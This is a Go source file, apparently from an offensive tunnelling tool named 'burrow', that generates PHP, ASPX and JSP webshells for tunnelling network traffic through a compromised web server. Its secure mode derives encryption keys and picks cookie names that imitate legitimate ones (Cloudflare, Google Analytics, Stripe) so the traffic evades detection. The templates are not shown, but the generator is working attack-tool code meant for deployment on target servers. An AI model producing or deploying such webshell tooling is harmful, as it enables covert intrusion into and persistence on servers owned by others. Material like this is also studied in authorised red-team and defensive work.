// Package webshell generates HTTP tunnel webshells for PHP, ASPX, and JSP.
//
// The generated webshells implement the same HTTP tunnel protocol as the
// Go httptunnel server, allowing the burrow httptunnel client to connect
// through an existing web server without deploying a separate binary.
package webshell

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"strings"

	"golang.org/x/crypto/hkdf"
)

// Format represents the output language for the webshell.
type Format string

const (
	FormatPHP  Format = "php"
	FormatASPX Format = "aspx"
	FormatJSP  Format = "jsp"
)

// ValidFormats returns all supported webshell formats.
func ValidFormats() []Format {
	return []Format{FormatPHP, FormatASPX, FormatJSP}
}

// Config holds generation parameters.
type Config struct {
	Format Format // Output language (php, aspx, jsp)
	Key    string // Shared encryption/authentication key
	Secure bool   // Generate secure mode webshell (AES-256-GCM)
}

// Generate produces the webshell source code for the given configuration.
// The returned string is a complete, self-contained file ready for deployment.
func Generate(cfg Config) (string, error) {
	if cfg.Key == "" {
		return "", fmt.Errorf("key is required")
	}

	keyBytes := []byte(cfg.Key)
	keyHex := hex.EncodeToString(keyBytes)
	authHash := sha256.Sum256(keyBytes)
	authHex := hex.EncodeToString(authHash[:])

	if cfg.Secure {
		return generateSecure(cfg.Format, keyBytes)
	}

	var tmpl string
	switch cfg.Format {
	case FormatPHP:
		tmpl = phpTemplate
	case FormatASPX:
		tmpl = aspxTemplate
	case FormatJSP:
		tmpl = jspTemplate
	default:
		return "", fmt.Errorf("unsupported format: %q (valid: php, aspx, jsp)", string(cfg.Format))
	}

	out := strings.ReplaceAll(tmpl, "__KEY_HEX__", keyHex)
	out = strings.ReplaceAll(out, "__AUTH_HEX__", authHex)
	return out, nil
}

// generateSecure produces a secure-mode webshell with AES-256-GCM encryption,
// cookie-based commands, and HTML-wrapped responses.
func generateSecure(format Format, psk []byte) (string, error) {
	// Derive the same key material the Go server/client would derive
	encKeyHex, cookieName, err := deriveSecureParams(psk)
	if err != nil {
		return "", fmt.Errorf("derive secure params: %w", err)
	}

	var tmpl string
	switch format {
	case FormatPHP:
		tmpl = phpSecureTemplate
	case FormatASPX:
		tmpl = aspxSecureTemplate
	case FormatJSP:
		tmpl = jspSecureTemplate
	default:
		return "", fmt.Errorf("unsupported format: %q (valid: php, aspx, jsp)", string(format))
	}

	out := strings.ReplaceAll(tmpl, "__ENC_KEY_HEX__", encKeyHex)
	out = strings.ReplaceAll(out, "__COOKIE_NAME__", cookieName)
	return out, nil
}

// deriveSecureParams mirrors DeriveSecureKeys from the httptunnel package
// to produce the same encryption key and cookie name.
func deriveSecureParams(psk []byte) (encKeyHex string, cookieName string, err error) {
	salt := []byte("burrow-secure-tunnel-v1")

	encReader := hkdf.New(sha256.New, psk, salt, []byte("encryption"))
	encKey := make([]byte, 32)
	if _, err := io.ReadFull(encReader, encKey); err != nil {
		return "", "", err
	}

	nameReader := hkdf.New(sha256.New, psk, salt, []byte("cookie-name"))
	nameByte := make([]byte, 1)
	if _, err := io.ReadFull(nameReader, nameByte); err != nil {
		return "", "", err
	}

	cookieNames := []string{
		"__cf_bm", "_ga", "XSRF-TOKEN", "__session", "_gid",
		"__cfduid", "csrftoken", "__stripe_mid",
	}
	name := cookieNames[int(nameByte[0])%len(cookieNames)]

	return hex.EncodeToString(encKey), name, nil
}
